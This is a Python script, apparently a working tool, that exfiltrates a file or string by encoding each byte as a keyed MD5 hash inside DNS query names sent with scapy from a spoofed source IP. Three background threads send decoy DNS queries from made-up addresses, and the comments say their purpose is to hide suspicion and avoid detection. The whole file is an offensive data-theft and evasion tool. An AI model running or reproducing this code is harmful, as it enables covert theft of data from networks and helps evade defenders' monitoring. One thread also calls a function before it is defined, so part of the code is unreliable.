import time
import os
import hashlib
from scapy.all import IP,UDP,DNS,DNSQR,send
import random
import threading
import sys
import string

if len(sys.argv) != 6:
    print("USAGE python exfil.py FILE/STR(f/s) SECRET FAKE_IP TARGET_IP(DNS) KEY")
    exit()
if sys.argv[1] not in ["f","s"]:
    print("Not a valid specifier for SECRET Format")
    exit()

OP = sys.argv[1]
SECRET = sys.argv[2]
FAKE = sys.argv[3]
TARGET = sys.argv[4]
PORT = 53
KEY = sys.argv[5]
RUN = True
domains = ["com","net","in","fr","co.uk","co.in","gov","edu","team","xyz"]
oct3 = FAKE.split(".")[2]

addrs = []
# Generating Address Pool
i=0
while i < 10:
    try :
        addr = f"192.168.{oct3}.{random.randint(3,254)}"
        assert addr not in addrs and addr != FAKE and addr != TARGET
        addrs.append(addr)
        i+=1
    except:
        pass
print("\nAddresses Involved - \n")
print(FAKE)
print(TARGET)
for addr in addrs:
    print(addr)

# Function to get bytes from the file
def get_bytes(path):
    # Read Bytes
    FILE = open(path,"rb")
    byte = FILE.read(1)
    out = []
    while byte:
        out.append(ord(byte))
        byte = FILE.read(1)
    FILE.close()
    return out

# Obfuscation
file = open("1000.txt")
random_sites = list(map(lambda x: x.strip(),file.readlines()))
def hide():
    while RUN:
        source=random.choice(addrs)
        ip = IP(src=source,dst=TARGET)
        udp = UDP(dport=53)
        dns = DNS(rd=1,qd=DNSQR(qname=random.choice(random_sites)))
        pkt = ip/udp/dns
        send(pkt,verbose=0)
        time.sleep(1)

ob = threading.Thread(target=hide)
ob.start()

# Send a few legitimate requests to hide suspisions further
def notme():
    while RUN:
        source=FAKE
        ip = IP(src=source,dst=TARGET)
        udp = UDP(dport=53)
        dns = DNS(rd=1,qd=DNSQR(qname=random.choice(random_sites)))
        pkt = ip/udp/dns
        send(pkt,verbose=0)
        time.sleep(1)

no = threading.Thread(target=notme)
no.start()

# Other addresses send random hashed requests to further avoid detection
abcd = string.ascii_lowercase + string.ascii_uppercase
def ustoo():
    while RUN:
        source=random.choice(addrs)
        ip = IP(src=source,dst=TARGET)
        udp = UDP(dport=53)
        dns = DNS(rd=1,qd=DNSQR(qname=f"https://{hash(random.choice(abcd))}.{domains[random.randint(0,len(domains)-1)]}"))
        pkt = ip/udp/dns
        send(pkt,verbose=0)
        time.sleep(1)

us = threading.Thread(target=ustoo)
us.start()

# Function to get hashes
def hash(word):
    word = word + KEY
    hash = word.encode()
    hash = hashlib.md5(hash)
    hash = hash.hexdigest()
    return hash

# Convert File to Bytes
if OP == "f":
    SECRET = get_bytes(SECRET)

# Summary
print("Total number of Bytes : ", len(SECRET))
INTERVAL = 30/len(SECRET)
print("Interval time set : ", INTERVAL)
print(f"Estimated Completion time : {((INTERVAL+0.12)*len(SECRET))/60} minutes")

# Start Exfiltration
ip = IP(src=FAKE,dst=TARGET,flags=4)
udp = UDP(dport=PORT)
for val in SECRET:
    dns = DNS(rd=1,qd=DNSQR(qname=f"https://{hash(str(val))}.{random.choice(domains)}"))
    pkt = ip/udp/dns
    send(pkt,verbose=0)
    time.sleep(INTERVAL)

print("FINISHED EXFILTRATION :)")

if OP == "s" and "--check" in sys.argv:
    print("No Checks for String Secret")

if OP == "f" and "--check" in sys.argv:
    sent = get_bytes(SECRET)
    # Extraction Check
    nf = open("sent","wb")
    sent = bytearray(sent)
    nf.write(sent)
    nf.close()

    # Remove the file after 30 seconds
    print("Verification will end in 30 seconds!")
    for i in range(30):
        time.sleep(1)
        print('=',end="")
    os.system("rm ./sent")
    
# Stop all running threads
RUN=False
